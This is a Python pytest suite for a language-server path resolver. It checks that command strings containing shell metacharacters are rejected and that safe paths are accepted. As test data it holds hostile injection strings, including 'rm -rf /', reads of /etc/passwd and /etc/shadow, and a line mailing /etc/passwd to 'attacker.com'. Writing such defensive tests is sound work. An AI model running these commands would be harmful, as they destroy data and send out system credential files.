"""Security tests for shell injection prevention in ServerPathResolver."""

import pytest
from pathlib import Path

from llm_lsp_cli.infrastructure.config.path_resolver import (
    ServerPathResolver,
)
from llm_lsp_cli.infrastructure.config.exceptions import ServerPathValidationError


def test_reject_command_with_semicolon_injection() -> None:
    """SEC-INJ-01: Commands with semicolon are rejected."""
    malicious_command = "$HOME/bin/server; rm -rf /tmp/*"

    with pytest.raises(ServerPathValidationError) as exc_info:
        ServerPathResolver.resolve(malicious_command)

    assert "shell metacharacter" in str(exc_info.value).lower()
    assert ";" in str(exc_info.value)


def test_reject_command_with_pipe_injection() -> None:
    """SEC-INJ-02: Commands with pipe are rejected."""
    malicious_command = "$HOME/bin/server | cat /etc/passwd"

    with pytest.raises(ServerPathValidationError):
        ServerPathResolver.resolve(malicious_command)


def test_reject_command_with_ampersand_injection() -> None:
    """SEC-INJ-03: Commands with ampersand are rejected."""
    malicious_command = "$HOME/bin/server & malicious_background_task"

    with pytest.raises(ServerPathValidationError):
        ServerPathResolver.resolve(malicious_command)


def test_reject_command_with_command_substitution() -> None:
    """SEC-INJ-04: Commands with $() substitution are rejected."""
    malicious_command = "$HOME/bin/$(whoami)_server"

    with pytest.raises(ServerPathValidationError):
        ServerPathResolver.resolve(malicious_command)


def test_reject_command_with_backtick_substitution() -> None:
    """SEC-INJ-05: Commands with backticks are rejected."""
    malicious_command = "$HOME/bin/`whoami`_server"

    with pytest.raises(ServerPathValidationError):
        ServerPathResolver.resolve(malicious_command)


def test_reject_command_with_redirect_injection() -> None:
    """SEC-INJ-06: Commands with redirects are rejected."""
    malicious_command = "$HOME/bin/server > /tmp/output.log 2>&1"

    with pytest.raises(ServerPathValidationError):
        ServerPathResolver.resolve(malicious_command)


def test_accept_safe_env_var_expansion(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """SEC-INJ-07: Safe environment variable paths are accepted."""
    # Arrange
    safe_dir = tmp_path / "safe_bin"
    safe_dir.mkdir()
    server_exe = safe_dir / "server"
    server_exe.write_text("#!/bin/sh\necho 'server'\n")
    server_exe.chmod(0o755)

    monkeypatch.setenv("SAFE_LSP_BIN", str(safe_dir))

    # Act - should NOT raise
    result = ServerPathResolver.resolve("$SAFE_LSP_BIN/server")

    # Assert
    assert result == str(server_exe.resolve())


def test_accept_safe_tilde_expansion(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """SEC-INJ-08: Safe tilde paths are accepted."""
    # Arrange
    mock_home = tmp_path / "home"
    mock_home.mkdir()
    bin_dir = mock_home / ".local" / "bin"
    bin_dir.mkdir(parents=True)
    server_exe = bin_dir / "server"
    server_exe.write_text("#!/bin/sh\necho 'server'\n")
    server_exe.chmod(0o755)

    monkeypatch.setenv("HOME", str(mock_home))

    # Act
    result = ServerPathResolver.resolve("~/.local/bin/server")

    # Assert
    assert result == str(server_exe.resolve())


def test_reject_multiple_metacharacters() -> None:
    """SEC-INJ-09: Combined metacharacter attacks are rejected."""
    # Multiple injection techniques in one command
    malicious_commands = [
        "$HOME/bin/server; cat /etc/passwd | mail attacker.com",
        "$HOME/bin/server && ./malicious.sh",
        "$(echo $HOME)/server; rm -rf /",
        "`echo $HOME`/server && cat /etc/shadow",
    ]

    for cmd in malicious_commands:
        with pytest.raises(ServerPathValidationError):
            ServerPathResolver.resolve(cmd)


def test_validation_before_expansion(monkeypatch: pytest.MonkeyPatch) -> None:
    """SEC-INJ-10: Metacharacter validation before env expansion."""
    # Arrange: Even if env var is safe, command with metachar should fail
    monkeypatch.setenv("MALICIOUS", "rm -rf /")

    # The semicolon should be caught before $MALICIOUS is expanded
    with pytest.raises(ServerPathValidationError):
        ServerPathResolver.resolve("$HOME/bin/server; $MALICIOUS")


def test_allow_safe_characters_in_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """SEC-INJ-11: Paths with safe chars (._-) are accepted."""
    # Arrange
    safe_dir = tmp_path / "my-lsp_servers.test"
    safe_dir.mkdir()
    server_exe = safe_dir / "pyright_langserver-v1.0"
    server_exe.write_text("#!/bin/sh\necho 'server'\n")
    server_exe.chmod(0o755)

    # Act
    result = ServerPathResolver.resolve(str(server_exe))

    # Assert
    assert Path(result).exists()
    assert result == str(server_exe.resolve())
